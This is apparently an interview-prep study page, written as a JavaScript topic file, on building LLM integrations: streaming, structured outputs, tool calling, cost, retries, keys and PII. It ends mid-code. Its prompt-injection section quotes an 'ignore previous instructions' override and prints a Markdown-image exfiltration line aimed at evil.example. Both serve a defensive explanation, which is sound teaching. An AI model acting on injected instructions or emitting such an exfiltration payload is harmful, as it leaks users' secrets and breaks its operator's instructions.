window.PREP_SITE.registerTopic({
  id: "ai-llm-integration",
  module: "ai",
  title: "LLM Integrations",
  estimatedReadTime: "45 min",
  tags: ["ai","llm","api","streaming","sse","structured-output","tool-calling","tokens","cost","latency","rate-limits","security","pii"],
  sections: [

// ─────────────────────────────────────────────────────────────
{ id: "revision", title: "⚡ Revision — Points to Remember", collapsible: false, html: `
<div class="revision-card">
  <h4>In one line</h4>
  <div class="revision-oneline">Put a <strong>backend LLM service</strong> in front of the provider that owns keys, quotas, streaming, validation, retries, fallback and per-call cost and latency telemetry, because the model is a <strong>stateless, slow, metered, sometimes-wrong</strong> dependency.</div>
  <h4>Key points</h4>
  <ul>
    <li><strong>The integration is the plumbing around the call:</strong> prompt wording matters, but most production failures, cost and latency come from the service around the model.</li>
    <li><strong>Stateless API:</strong> <code>f(system, messages, tools, params)</code> → content blocks + <code>stop_reason</code> + <code>usage</code>. "Memory" means history is resent every turn.</li>
    <li><strong>Keys never in the client</strong> (<code>EXPO_PUBLIC_*</code> ships in the bundle). Clients call your API with their session. Direct realtime uses short-lived scoped tokens minted by your backend.</li>
    <li><strong>Your endpoint is an expensive resource:</strong> auth, per-user and per-tenant rate limits, input caps, daily token or dollar budgets.</li>
    <li><strong>SSE streaming through your backend:</strong> first words in about a second instead of after ~8 s. Provider stream → your own <code>delta</code>/<code>done</code>/<code>error</code> events → client fetch + parser. Use heartbeats, <code>X-Accel-Buffering: no</code>, a streaming UTF-8 decoder, and abort upstream when the client closes.</li>
    <li><strong>Structured outputs</strong> = schema-constrained decoding + Zod, never regex. Guard against truncation and refusals. Valid shape ≠ correct values: the result is a <em>proposal</em> that business rules in code still check.</li>
    <li><strong>Tool calling:</strong> the model proposes <code>tool_use</code>, your code executes it with the user's permissions and returns <code>tool_result</code>. Looping that is an agent.</li>
    <li><strong>Tokens:</strong> ~4 chars each in English, more for code and non-Latin scripts, and tokenizers differ per model. Overflowing the window is a hard 400.</li>
    <li><strong>Cost = input × in-price + output × out-price</strong>, with output often 4–5× pricier per token. <strong>Latency ≈ TTFT + output_tokens ÷ speed</strong>: output length dominates, and streaming makes perceived latency ≈ TTFT.</li>
    <li><strong>Cost levers:</strong> model routing to the smallest model that holds quality, prompt caching (~0.1× cached reads, byte-identical prefix), Batch API (~50% off), output caps, context trimming, response caching.</li>
    <li><strong>Reliability:</strong> idle and overall timeouts; retry only 408/409/429/5xx/overloaded/network errors with full-jitter backoff, honour <code>retry-after</code>, cap attempts, one layer only (SDKs retry by default); circuit breakers.</li>
    <li><strong>Provider abstraction:</strong> capability tiers, normalized types and error kinds, a router with a circuit breaker. Prompts, tool formats and caching don't port, so fallbacks need evals.</li>
    <li><strong>Prompt injection</strong> cannot be fully prevented, so it is contained: least privilege, approvals, data-not-instructions, safe rendering.</li>
    <li><strong>PII:</strong> minimize → redact (NER/DLP) → check retention and residency terms → redact your own traces.</li>
    <li><strong>Per-call telemetry:</strong> feature, tenant, model, prompt version, tokens (incl. cache), cost, TTFT, latency, stop reason. Track cost per successful task.</li>
  </ul>
  <h4>Common trap</h4>
  <div class="revision-trap"><strong>Treating "200 OK" as success.</strong> LLM calls fail <em>inside</em> successful responses: truncated at <code>max_tokens</code>, refused, schema-valid but wrong, or served by a fallback whose prompt was never evaluated. Fix: check <code>stop_reason</code> every call, validate shape and business rules in code, and log which model actually served the request.</div>
  <h4>Say this in the interview</h4>
  <div class="revision-say">"I treat the model as an expensive, slow, rate-limited, sometimes-wrong dependency. It sits behind a backend service that owns keys, quotas, streaming, validation, retries, fallbacks, and per-call cost and latency telemetry."</div>
  <div class="revision-say">"Latency is time-to-first-token plus output tokens over decode speed, so I stream, keep outputs short and route easy traffic to a smaller model. Cost is tokens times price, so caching, routing and the Batch API are my big levers."</div>
  <div class="revision-say">"Structured outputs give me the shape, not the truth. I still check the stop reason and run business rules in code before anything writes to a real system."</div>
</div>
` },

// ─────────────────────────────────────────────────────────────
{ id: "what-why", title: "🧠 What & Why", collapsible: true, html: `
<h3>What "LLM integration" means in practice</h3>
<p>The model call is one line. The integration is the system around it. In full-stack and Forward Deployed Engineer (FDE) roles you are the person who:</p>
<ul>
  <li>Exposes an LLM capability (chat, extraction, summarization, classification) through a <strong>backend endpoint</strong> that web and mobile clients call.</li>
  <li>Chooses the <strong>provider and model</strong> per use case, and keeps that choice in config so it can change without code edits.</li>
  <li>Wires <strong>streaming</strong> UX, <strong>structured</strong> outputs and simple <strong>tool calls</strong> into existing systems (CRM, booking, ticketing).</li>
  <li>Keeps it within a <strong>budget</strong> (per request, user, tenant) and a <strong>latency SLO</strong>, keeps it <strong>safe</strong> (keys, PII, injection, rendering), and makes it <strong>observable</strong> (see <a href="#/topic/ai-evals">LLM Evals &amp; Guardrails</a>).</li>
</ul>

<h3>Why it is different from a normal API dependency</h3>
<table>
  <thead><tr><th></th><th>Typical REST dependency</th><th>LLM provider call</th></tr></thead>
  <tbody>
    <tr><td>Latency</td><td>20–200 ms</td><td>0.5 s to 60 s+ (grows with output length and reasoning)</td></tr>
    <tr><td>Cost per call</td><td>~0 or flat</td><td>Often 0.1–5 cents, per token, growing with prompt size</td></tr>
    <tr><td>Determinism</td><td>Same input, same output</td><td>Outputs vary, even at "temperature 0"</td></tr>
    <tr><td>Failure shape</td><td>4xx / 5xx</td><td>4xx / 5xx / 429 / overloaded, <strong>plus "200 OK but wrong"</strong>: truncated, refused, hallucinated, off-schema</td></tr>
    <tr><td>Rate limits</td><td>Requests/sec</td><td>Requests <em>and</em> input tokens <em>and</em> output tokens per minute, per tier</td></tr>
    <tr><td>Versioning</td><td>Semver'd endpoints</td><td>Models are retired on a schedule, and a new model is a behaviour change</td></tr>
  </tbody>
</table>
<p><strong>Why interviewers care:</strong> FDE loops test shipping an LLM feature into a <em>customer's</em> messy environment (their auth, data residency, flaky internal APIs, budget). Full-stack loops test the end-to-end path from an RN or web client streaming from a Node backend. Both ask for numbers: cost per month, p95 latency, what happens when the provider is down.</p>

<h3>When NOT to use an LLM</h3>
<ul>
  <li><strong>The rule is deterministic</strong> (known date formats, routing on a dropdown value, IBAN validation). Code is cheaper, faster and always correct.</li>
  <li><strong>Latency budget under ~200 ms</strong> per interaction (per-keystroke autocomplete). Use a cache or a small classic model.</li>
  <li><strong>Exact arithmetic or aggregation</strong>: let SQL do the sum, and let the LLM explain the result if needed.</li>
  <li><strong>Errors are catastrophic and cannot be reviewed</strong> (automatic payments, dosing). Use the LLM only as a drafting assistant with a human or deterministic check.</li>
  <li><strong>A lookup or a trained classifier is enough.</strong> You can use an LLM to bootstrap the labels, then serve the cheap model.</li>
</ul>
` },

// ─────────────────────────────────────────────────────────────
{ id: "mental-model", title: "🗺️ Mental Model", collapsible: true, html: `
<h3>The request path: clients never talk to the provider</h3>
<div class="diagram">
<pre>
 RN / web client            Your API (edge)                  LLM service (your code)                 Provider
 ───────────────            ───────────────                  ───────────────────────                 ────────
 POST /chat/stream ───────► authN (session/JWT)
  (no provider key)         authZ + per-user quota  ───────► build prompt (template vN)
                            input validation                 pick model (tier → model id from config)
                                                             count/trim context
                                                             call provider (timeout, retry, fallback) ──► Messages API
                                                             validate output (schema + business rules)
 ◄── SSE: delta, delta, ... ◄──────────────────────────────── stream deltas back            ◄──────────── SSE stream
 ◄── SSE: done {usage}                                       log trace: model, tokens, cost, latency,
                                                             stop_reason, prompt version, user/tenant
</pre>
</div>

<h3>The model is a stateless function</h3>
<div class="diagram">
<pre>
  input:  system      ← operator instructions
          messages[]  ← alternating user / assistant turns (+ tool results)
          tools[]     ← JSON-schema'd functions the model may ask you to call
          params      ← model, max_tokens, output format, effort/temperature...

  output: content[]   ← text, tool_use (and thinking on reasoning models)
          stop_reason ← end_turn | max_tokens | tool_use | stop_sequence | refusal | ...
          usage       ← input_tokens, output_tokens, cache read/write tokens
</pre>
</div>
<p>Nothing persists between calls unless you persist it. A conversation is an array <em>you</em> store and resend, so turn 20 pays for turns 1–19 again. Prompt caching softens that.</p>

<h3>Trust levels of what enters the context</h3>
<table>
  <thead><tr><th>Source</th><th>Controlled by</th><th>Treat as</th></tr></thead>
  <tbody>
    <tr><td>System prompt</td><td>You (operator)</td><td>Instructions</td></tr>
    <tr><td>User message</td><td>End user</td><td>A request, possibly adversarial</td></tr>
    <tr><td>Retrieved docs, emails, web pages, tool results</td><td>Third parties</td><td><strong>Data only, never instructions</strong> (indirect injection vector)</td></tr>
    <tr><td>Model output</td><td>The model, influenced by all of the above</td><td>Untrusted: validate before acting, sanitize before rendering</td></tr>
  </tbody>
</table>

<h3>Tokens and latency</h3>
<ul>
  <li><strong>~4 characters ≈ 1 token</strong> in English (~0.75 words). Code, JSON and non-Latin scripts use more, and tokenizers differ per model, so measure with the provider's counter. <strong>Context window</strong> = max input + output per call.</li>
  <li>Prices are per million tokens (MTok): output costs several times more than input, cached input reads cost much less, and cache writes cost slightly more.</li>
</ul>
<div class="diagram">
<pre>
 total latency ≈ network + queueing + TTFT (prefill: reads the whole prompt)
                 + output_tokens / decode_speed

 e.g. TTFT 0.8 s, 400 output tokens at 60 tok/s
      non-streamed: user waits ≈ 0.8 + 6.7 ≈ 7.5 s
      streamed:     text visible at ≈ 0.8 s, done at ≈ 7.5 s
 (orders of magnitude only — measure your provider, model and prompt size)
</pre>
</div>
<p><strong>Output tokens dominate.</strong> Halving the answer roughly halves decode time. A longer prompt mostly raises TTFT and cost. Reasoning models add hidden output tokens, which means more latency and cost, sometimes worth it for accuracy.</p>

<div class="callout warn">
  <div class="callout-title">Common misconception</div>
  <p>"The key is in env config, not in source, so it's safe." In React Native and web, anything the client can read ships in the bundle, including <code>EXPO_PUBLIC_*</code> variables inlined at build time. Anyone can unzip an APK or open devtools and spend your money. The key belongs on a server behind your own auth and quotas.</p>
</div>
` },

// ─────────────────────────────────────────────────────────────
{ id: "mechanics", title: "⚙️ Mechanics", collapsible: true, html: `
<h3>1. Anatomy of a provider call (messages, roles, stop reasons)</h3>
<p>The two dominant API shapes are close cousins. Know both well enough to map one onto the other:</p>
<table>
  <thead><tr><th>Concept</th><th>Anthropic Messages API</th><th>OpenAI Chat Completions</th></tr></thead>
  <tbody>
    <tr><td>System instructions</td><td>Top-level <code>system</code></td><td>A <code>system</code> (or newer <code>developer</code>) message</td></tr>
    <tr><td>Output</td><td><code>content[]</code> blocks: text, tool_use, thinking</td><td><code>choices[0].message</code>: content, tool_calls</td></tr>
    <tr><td>Tool results</td><td><code>tool_result</code> blocks in the next <strong>user</strong> message</td><td><code>role: 'tool'</code> messages with <code>tool_call_id</code></td></tr>
    <tr><td>Why it stopped</td><td><code>stop_reason</code>: end_turn, max_tokens, tool_use, stop_sequence, refusal, pause_turn</td><td><code>finish_reason</code>: stop, length, tool_calls, content_filter</td></tr>
    <tr><td>Usage</td><td><code>input_tokens / output_tokens / cache_read_input_tokens</code></td><td><code>prompt_tokens / completion_tokens</code> (+ cached details)</td></tr>
  </tbody>
</table>
<p>OpenAI also has the newer Responses API, and Google, Bedrock and others have their own shapes. Field names drift, so check current docs. The concepts in this table don't change.</p>
<pre><code class="language-ts">// Server-side only. The SDK reads ANTHROPIC_API_KEY from the environment.
import Anthropic from '@anthropic-ai/sdk';
const anthropic = new Anthropic({ timeout: 60_000, maxRetries: 2 }); // TS timeout is in ms; SDK retries 408/409/429/5xx

const msg = await anthropic.messages.create({
  model: config.models.summarize,        // from config, never hardcoded at call sites
  max_tokens: 512,                       // always cap output
  system: 'You summarize support tickets for on-call engineers. Be terse.',
  messages: [{ role: 'user', content: ticketText }],
});
if (msg.stop_reason === 'max_tokens') log.warn('summary truncated', { id: msg.id });
const text = msg.content.filter((b): b is Anthropic.TextBlock =&gt; b.type === 'text').map((b) =&gt; b.text).join('');
log.info('llm_call', { model: msg.model, usage: msg.usage, stop: msg.stop_reason });</code></pre>

<h3>2. Streaming end-to-end (provider → Node → UI)</h3>
<p><strong>Server-Sent Events (SSE)</strong> is an HTTP response with <code>Content-Type: text/event-stream</code> that stays open. Each event is a group of <code>event:</code> / <code>data:</code> / <code>id:</code> lines ended by a blank line, and lines starting with <code>:</code> are comments. Providers stream to you over SSE and you re-stream to the client. <code>EventSource</code> only supports GET without a body, so chat UIs read the stream with <code>fetch</code> + <code>ReadableStream</code>. (For SSE vs WebSocket vs polling, see <a href="#/topic/api-realtime">Realtime Decision Tree</a>.)</p>
<div class="diagram">
<pre>
 provider SSE events                    your SSE events to the client
 ───────────────────                    ─────────────────────────────
 content_block_delta "Hel"     ──────►  event: delta  data: {"text":"Hel"}
 content_block_delta "lo"      ──────►  event: delta  data: {"text":"lo"}
 message_delta stop_reason+usage
 message_stop                  ──────►  event: done   data: {"stopReason":"end_turn","usage":{...}}
 (error mid-stream)            ──────►  event: error  data: {"code":"overloaded","retryable":true}
                                        : ping   ← comment heartbeat every 15 s
</pre>
</div>
<p>Define your <em>own</em> event vocabulary rather than proxying raw provider events. It decouples clients from the provider (switch providers without an app release), hides internals, and lets you add events (citations, a conversation title).</p>
<pre><code class="language-ts">// server: routes/chatStream.ts (Express)
const Body = z.object({ conversationId: z.string().uuid(), message: z.string().min(1).max(8000) });

export async function chatStream(req: Request, res: Response) {
  const user = await requireUser(req);                 // 401 without a session
  const body = Body.parse(req.body);                   // 400 via error middleware
  await assertWithinQuota(user.id);                    // 429 when the daily budget is spent
  const history = await loadHistory(body.conversationId, user.id); // the server owns history

  res.writeHead(200, {
    'Content-Type': 'text/event-stream; charset=utf-8',
    'Cache-Control': 'no-cache, no-transform',         // no-transform: proxies must not compress/buffer
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',                         // nginx: do not buffer
  });
  const send = (event: string, data: unknown) =&gt;
    res.write('event: ' + event + '\\ndata: ' + JSON.stringify(data) + '\\n\\n');
  const heartbeat = setInterval(() =&gt; res.write(': ping\\n\\n'), 15_000);

  const stream = anthropic.messages.stream({
    model: config.models.chat,
    max_tokens: 1024,
    system: [{ type: 'text', text: CHAT_SYSTEM_PROMPT, cache_control: { type: 'ephemeral' } }],
    messages: [...history, { role: 'user', content: body.message }],
  });
  res.on('close', () =&gt; { if (!res.writableEnded) stream.abort(); }); // user left → stop paying

  let answer = '';
  stream.on('text', (delta) =&gt; { answer += delta; send('delta', { text: delta }); });
  try {
    const final = await stream.finalMessage();
    await saveTurn(body.conversationId, body.message, answer, final.usage);
    await recordSpend(user.id, 'chat', final.model, final.usage);
    send('done', { stopReason: final.stop_reason, usage: final.usage });
  } catch (err) {
    if (err instanceof Anthropic.APIUserAbortError) return;          // client already gone
    log.error('chat_stream_failed', { err, userId: user.id });
    if (!res.writableEnded) send('error', { code: errorCode(err), retryable: isRetryable(err) });
  } finally {
    clearInterval(heartbeat);
    if (!res.writableEnded) res.end();
  }
}</code></pre>
<pre><code class="language-ts">// client: lib/readSSE.ts (browser, and RN where fetch exposes a readable body)
export async function* readSSE(res: Response): AsyncGenerator&lt;{ event: string; data: string }&gt; {
  if (!res.body) throw new Error('streaming body not supported in this runtime');
  const reader = res.body.pipeThrough(new TextDecoderStream()).getReader(); // safe for split UTF-8
  let buf = '';
  for (;;) {
    const { value, done } = await reader.read();
    if (done) return;
    buf += value.replace(/\\r\\n/g, '\\n');              // the spec allows CRLF
    let idx: number;
    while ((idx = buf.indexOf('\\n\\n')) !== -1) {        // a blank line ends one event
      const raw = buf.slice(0, idx);
      buf = buf.slice(idx + 2);
      let event = 'message';
      const data: string[] = [];
      for (const line of raw.split('\\n')) {
        if (line.startsWith(':')) continue;              // heartbeat / comment
        if (line.startsWith('event:')) event = line.slice(6).trim();
        else if (line.startsWith('data:')) data.push(line.slice(5).trimStart());
      }
      if (data.length) yield { event, data: data.join('\\n') };
    }
  }
}</code></pre>
<p><strong>React Native:</strong> RN's default <code>fetch</code> has historically not exposed <code>response.body</code> as a stream. Use Expo's streaming-capable <code>expo/fetch</code> (recent SDKs), an XHR-based SSE library such as <code>react-native-sse</code> (supports POST and headers), or a WebSocket. Check the docs for your version. Keep the same server event vocabulary either way.</p>

<h3>3. Structured outputs (typed data, not prose)</h3>
<table>
  <thead><tr><th>Level</th><th>Guarantee</th><th>Use</th></tr></thead>
  <tbody>
    <tr><td>Prompt-only ("reply with JSON like…")</td><td>None: fences, prose and missing fields all happen</td><td>Prototypes</td></tr>
    <tr><td>JSON mode</td><td>Valid JSON, any shape</td><td>Legacy</td></tr>
    <tr><td><strong>Schema-constrained</strong> (JSON Schema, or a strict tool whose input <em>is</em> the output)</td><td>Matches the schema unless truncated or refused</td><td>Default for extraction and classification</td></tr>
  </tbody>
</table>
<p>With the Anthropic TS SDK you pass a Zod schema via <code>output_config: { format: zodOutputFormat(Schema) }</code> to <code>messages.parse()</code> and read a typed <code>parsed_output</code>, which is <code>null</code> when parsing failed. With OpenAI it's a <code>json_schema</code> response format with <code>strict: true</code>. Example 3 shows the full flow. Two rules hold everywhere. (1) Schema-valid is not <em>correct</em>, so check business rules in code. (2) Providers support only a subset of JSON Schema (for example, length and range constraints may be stripped), so re-check with Zod.</p>

<h3>4. Tool calling basics</h3>
<p>You describe functions with a name, a description and a JSON-Schema input. The model may reply with a <code>tool_use</code> block (name + arguments). <strong>Your code</strong> executes it and returns a <code>tool_result</code>, and the model continues. The model never executes anything itself.</p>
<pre><code class="language-ts">const tools: Anthropic.Tool[] = [{
  name: 'get_room_availability',
  description: 'List free meeting rooms for a time window. Use before suggesting any room.',
  strict: true,                                  // arguments guaranteed to match the schema
  input_schema: {
    type: 'object',
    properties: { startIso: { type: 'string' }, endIso: { type: 'string' }, minCapacity: { type: 'integer' } },
    required: ['startIso', 'endIso', 'minCapacity'],
    additionalProperties: false,
  },
}];

const first = await anthropic.messages.create({ model, max_tokens: 1024, tools, messages });
const call = first.content.find((b): b is Anthropic.ToolUseBlock =&gt; b.type === 'tool_use');
if (call) {
  const rooms = await bookingApi.availability(call.input as AvailabilityArgs, { userId }); // user's auth
  const second = await anthropic.messages.create({ model, max_tokens: 1024, tools, messages: [
    ...messages,
    { role: 'assistant', content: first.content },                 // echo the full assistant turn
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: call.id, content: JSON.stringify(rooms) }] },
  ] });
}</code></pre>
<p>Run this in a loop until the model stops asking for tools and you have an <strong>agent</strong>. See <a href="#/topic/ai-agents-tools">Agents, Tool Use &amp; MCP</a>.</p>

<h3>5. Tokens and context windows</h3>
<p>Budget the context like memory. Example for a support assistant on a 200K window:</p>
<table>
  <thead><tr><th>Slice</th><th>Budget</th><th>When it overflows</th></tr></thead>
  <tbody>
    <tr><td>System prompt + tools</td><td>~3K</td><td>Keep stable (cacheable), trim examples</td></tr>
    <tr><td>Retrieved docs</td><td>~10–20K</td><td>Fewer, better chunks, rerank (see <a href="#/topic/ai-rag">RAG</a>)</td></tr>
    <tr><td>History</td><td>~10–30K</td><td>Last N turns verbatim + a running summary</td></tr>
    <tr><td>User input</td><td>Capped (e.g. 8K)</td><td>Reject or chunk</td></tr>
    <tr><td>Reserved output</td><td>1–4K (more for reasoning)</td><td>Never let input crowd it out</td></tr>
  </tbody>
</table>
<p>Near the limit, use the provider's counter (for example <code>anthropic.messages.countTokens({ model, system, messages })</code>) instead of <code>length / 4</code>. Overflow is a hard 400. Bigger context is not free accuracy: it costs money and prefill time, and models attend less reliably to the middle of very long contexts ("lost in the middle").</p>

<h3>6. Cost levers (with numbers)</h3>
<p>Worked estimate with <strong>illustrative prices</strong> (check current pricing pages): large model L at $3/MTok in and $15/MTok out, small model S at $0.25 in and $1.25 out. The assistant handles 50,000 requests/day, each with 3,000 input tokens (2,000 of them a static system prompt + tools) and 400 output tokens.</p>
<table>
  <thead><tr><th>Step</th><th>Per request</th><th>Per month</th></tr></thead>
  <tbody>
    <tr><td>Baseline, all on L</td><td>3,000×$3/M + 400×$15/M = <strong>$0.0150</strong></td><td>~$22,500</td></tr>
    <tr><td>+ cache the 2,000-token prefix (reads ~0.1×)</td><td>1,000×$3/M + 2,000×$0.3/M + $0.006 = <strong>$0.0096</strong></td><td>~$14,400 (−36%)</td></tr>
    <tr><td>+ tighter answers (250 output tokens)</td><td>$0.0036 + 250×$15/M = <strong>$0.0074</strong></td><td>~$11,000</td></tr>
    <tr><td>+ route 60% of easy requests to S</td><td>0.4×$0.0074 + 0.6×~$0.0006 = <strong>~$0.0033</strong></td><td>~$5,000 (−78%)</td></tr>
  </tbody>
</table>
<table>
  <thead><tr><th>Lever</th><th>Effect</th><th>Catch</th></tr></thead>
  <tbody>
    <tr><td><strong>Routing / cascade</strong> (small first, escalate)</td><td>Often the biggest win (5–20× cheaper tier)</td><td>Needs evals per tier. Caches are per model.</td></tr>
    <tr><td><strong>Prompt caching</strong></td><td>Cached reads ~10% of input price, lower TTFT</td><td>Byte-identical prefix, minimum length, short TTL, slightly pricier writes</td></tr>
    <tr><td><strong>Batch API</strong></td><td>~50% off at major providers</td><td>Async (hours), unordered results</td></tr>
    <tr><td><strong>Output caps + concise instructions</strong></td><td>Cuts the expensive side and latency</td><td>Watch truncation</td></tr>
    <tr><td><strong>Context trimming</strong></td><td>Linear in tokens removed</td><td>May drop needed facts, so eval it</td></tr>
    <tr><td><strong>Response cache</strong> (exact or semantic)</td><td>Near-free FAQ repeats</td><td>Staleness, cross-tenant leaks, false hits</td></tr>
    <tr><td><strong>Reasoning effort controls</strong></td><td>Fewer hidden tokens on easy routes</td><td>Quality on hard tasks</td></tr>
  </tbody>
</table>
<p><strong>Attribute every call.</strong> Compute cost from <code>usage</code> (input, output, cache-read and cache-write tokens) times per-model prices kept in config, and tag it with feature, tenant, model and prompt version. Cost per <em>successful task</em> is the business number.</p>

<h3>7. Latency levers</h3>
<ul>
  <li><strong>Stream</strong> everything user-facing (perceived latency becomes TTFT). Keep <strong>outputs short</strong> and use a <strong>smaller or faster model</strong> on the hot path, with reasoning only where it measurably helps.</li>
  <li><strong>Prompt caching</strong> also cuts prefill time. <strong>Parallelize</strong> independent calls (classify + retrieve) instead of chaining them.</li>
  <li><strong>Move work off the request path</strong> (summarize on upload via a queue, see <a href="#/topic/be-queues">Queues &amp; Streaming</a>). Keep connections warm near the provider region. Show status UX ("searching your bookings…") from tool events.</li>
</ul>

<h3>8. Rate limits, retries, timeouts</h3>
<ul>
  <li>Limits apply per org or workspace on several axes at once (<strong>requests/min, input tokens/min, output tokens/min</strong>), with tiers that grow with spend. Exceeding one returns <strong>429</strong>, usually with <code>retry-after</code>. Providers may also return "overloaded" (Anthropic uses 529). Header names vary, so check the docs.</li>
  <li><strong>Retry only what can succeed:</strong> 408, 409, 429, 5xx/overloaded, network errors. <strong>Never</strong> retry 400 (bad request, context too long), 401/403 or 404 (bad model id).</li>
  <li><strong>Full-jitter backoff</strong> <code>random(0, min(cap, base·2^attempt))</code>, honour <code>retry-after</code>, cap attempts. <strong>Own retries in one layer</strong>: SDK retries (2 by default) × wrapper × gateway can turn one click into a dozen calls during an incident.</li>
  <li><strong>Timeouts:</strong> streams need an idle timeout (no bytes for N s) <em>and</em> an overall ceiling. Long non-streamed generations are the classic HTTP-timeout cause, so stream them.</li>
  <li><strong>Throttle yourself:</strong> for fan-out jobs, put a token-aware limiter (a token bucket sized to your share of input tokens/min, Redis-backed across workers) or a fixed-concurrency queue in front of the provider, plus a circuit breaker (see <a href="#/topic/be-resilience">Resilience</a>).</li>
</ul>

<h3>9. Provider abstraction and fallback</h3>
<p>Callers ask for a <strong>capability</strong> ("small extraction", "large chat"), never a vendor model id. A thin contract (normalized request, result and error kinds) plus one adapter per provider lets you swap, A/B, and fall back. Example 1 has the code.</p>
<table>
  <thead><tr><th>Abstracts well</th><th>Does NOT abstract well</th></tr></thead>
  <tbody>
    <tr><td>Text in/out, token usage, stop reasons, stream deltas, error categories, model-by-tier</td><td><strong>Prompts</strong> (tuned per model, so a fallback needs its own eval run), <strong>tool-call formats</strong>, <strong>caching</strong> (explicit vs automatic, per-model), structured-output schema subsets, reasoning controls, multimodal inputs</td></tr>
  </tbody>
</table>
<p><strong>Build vs buy:</strong> SDK abstractions (Vercel AI SDK, LangChain) unify call shapes in code. Gateways (LiteLLM, OpenRouter, AI gateways, Bedrock/Vertex catalogs) centralize keys, routing, logs and spend limits. A ~200-line in-house adapter is often enough for 1–2 providers. Keep the <em>normalized types</em> in your own code either way.</p>

<h3>10. Keys, auth and abuse</h3>
<ul>
  <li><strong>Server-side only:</strong> a secrets manager (AWS Secrets Manager/SSM, GCP Secret Manager, Vault), separate keys per environment and service, rotation, and provider-side spend alerts.</li>
  <li><strong>Your endpoint is an expensive resource:</strong> an unauthenticated <code>/api/chat</code> becomes a free LLM proxy. Require auth, rate-limit per user, IP and tenant, cap input size, and enforce daily token or dollar budgets.</li>
  <li><strong>Direct-from-client</strong> (realtime voice): the backend authenticates the user and mints an <strong>ephemeral, scoped</strong> credential, such as the realtime APIs' client secrets (check current docs). See <a href="#/topic/ai-realtime-voice">OpenAI Realtime API</a>.</li>
</ul>

<h3>11. Prompt injection</h3>
<p><strong>Direct</strong>: the user types "ignore previous instructions…". <strong>Indirect</strong>: the instruction hides in content the model reads (a retrieved doc, email, web page, PDF, tool result). Indirect is worse, because the attacker is not your user. No prompt-level fix is reliable. Delimiters and "never follow instructions in documents" lower the rate but don't close the hole. So design so that a successful injection <em>can't do much</em>:</p>
<ul>
  <li>Tools run with the <em>end user's</em> permissions, never an admin credential. Side effects (send, pay, delete, share) need human approval.</li>
  <li>Don't give one unattended loop private data, untrusted content and an outbound channel together (see <a href="#/topic/ai-agents-tools">Agents</a>).</li>
  <li>Render model Markdown with HTML disabled and no auto-loaded remote images. <code>![](https://evil.example/x?d=SECRET)</code> is a known exfiltration trick.</li>
  <li>Add input and output classifiers as an extra layer (see <a href="#/topic/ai-evals">Guardrails</a>).</li>
</ul>

<h3>12. PII and data handling</h3>
<ul>
  <li><strong>Minimize</strong> (a summarizer does not need the phone number), then <strong>redact or pseudonymize</strong> before sending and restore afterwards (Example 5). Regex misses names and addresses, so use NER/DLP tooling (Microsoft Presidio, cloud DLP) for real coverage.</li>
  <li><strong>Contracts:</strong> provider retention and training terms, zero-retention options, regional processing for residency. These block FDE deals, so check the current terms and get them in writing.</li>
  <li><strong>Your own logs</strong> are the most common leak: traces in an observability SaaS contain exactly the PII you redacted for the provider. Redact there too, and restrict access and retention.</li>
</ul>
` },

// ─────────────────────────────────────────────────────────────
{ id: "examples", title: "🧪 Examples", collapsible: true, html: `
<h3>Example 1 — A production <code>complete()</code> with routing, retries and fallback</h3>
<pre><code class="language-ts">// llm/types.ts — your normalized contract
export interface LlmRequest {
  feature: string;                 // 'support-chat' | 'ticket-summary' — cost attribution
  tier: 'small' | 'large';         // a capability, not a vendor model id
  system: string;
  messages: { role: 'user' | 'assistant'; content: string }[];
  maxTokens: number;
  signal?: AbortSignal;
}
export interface LlmResult {
  text: string;
  stopReason: 'end' | 'length' | 'tool' | 'refusal' | 'other';
  usage: { inputTokens: number; outputTokens: number; cachedInputTokens: number };
  provider: string; model: string; latencyMs: number;
}
export class LlmError extends Error {
  constructor(message: string,
    readonly kind: 'rate_limit' | 'overloaded' | 'timeout' | 'network' | 'server' | 'bad_request' | 'auth',
    readonly provider: string) { super(message); }
  get retryable() { return this.kind !== 'bad_request' &amp;&amp; this.kind !== 'auth'; }
}
export interface LlmProvider { name: string; complete(req: LlmRequest, model: string): Promise&lt;LlmResult&gt; }</code></pre>
<pre><code class="language-ts">// llm/providers/anthropic.ts
import Anthropic from '@anthropic-ai/sdk';
const client = new Anthropic({ maxRetries: 0, timeout: 60_000 }); // the router owns retries

const STOP: Record&lt;string, LlmResult['stopReason']&gt; = {
  end_turn: 'end', stop_sequence: 'end', max_tokens: 'length', tool_use: 'tool', refusal: 'refusal',
};

function mapError(err: unknown): LlmError {
  const e = (kind: LlmError['kind']) =&gt; new LlmError(String(err), kind, 'anthropic');
  if (err instanceof Anthropic.RateLimitError) return e('rate_limit');
  if (err instanceof Anthropic.APIConnectionTimeoutError) return e('timeout');   // check before its parent class
  if (err instanceof Anthropic.APIConnectionError) return e('network');
  if (err instanceof Anthropic.AuthenticationError || err instanceof Anthropic.PermissionDeniedError) return e('auth');
  if (err instanceof Anthropic.APIError) {
    const s = err.status ?? 500;
    return e(s === 529 ? 'overloaded' : s &gt;= 500 ? 'server' : 'bad_request');
  }
  return e('server');
}

export const anthropicProvider: LlmProvider = {
  name: 'anthropic',
  async complete(req, model) {
    const t0 = performance.now();
    try {
      const msg = await client.messages.create({
        model,
        max_tokens: req.maxTokens,
        system: [{ type: 'text', text: req.system, cache_control: { type: 'ephemeral' } }],
        messages: req.messages,
      }, { signal: req.signal });
      return {
        text: msg.content.filter((b): b is Anthropic.TextBlock =&gt; b.type === 'text').map((b) =&gt; b.text).join(''),
        stopReason: STOP[msg.stop_reason ?? ''] ?? 'other',
        usage: {
          inputTokens: msg.usage.input_tokens,
          outputTokens: msg.usage.output_tokens,
          cachedInputTokens: msg.usage.cache_read_input_tokens ?? 0,
        },
        provider: 'anthropic',
        model: msg.model,                       // what actually served the call
        latencyMs: performance.now() - t0,
      };
    } catch (err) {
      throw mapError(err);
    }
  },
};</code></pre>
<pre><code class="language-ts">// llm/providers/openai.ts — same contract, different wire shape (verify field names in current docs)
const r = await oai.chat.completions.create({
  model,
  max_completion_tokens: req.maxTokens,          // older models used max_tokens
  messages: [{ role: 'system', content: req.system }, ...req.messages],
}, { signal: req.signal });
// map: choices[0].message.content → text; finish_reason stop/length/tool_calls/content_filter
//      → end/length/tool/refusal; usage.prompt_tokens/completion_tokens → usage; OpenAI.APIError.status → LlmError</code></pre>
<pre><code class="language-ts">// llm/router.ts
const ROUTES: Record&lt;LlmRequest['tier'], { provider: LlmProvider; model: string }[]&gt; = {
  large: [
    { provider: anthropicProvider, model: config.models.largePrimary },   // from env/config
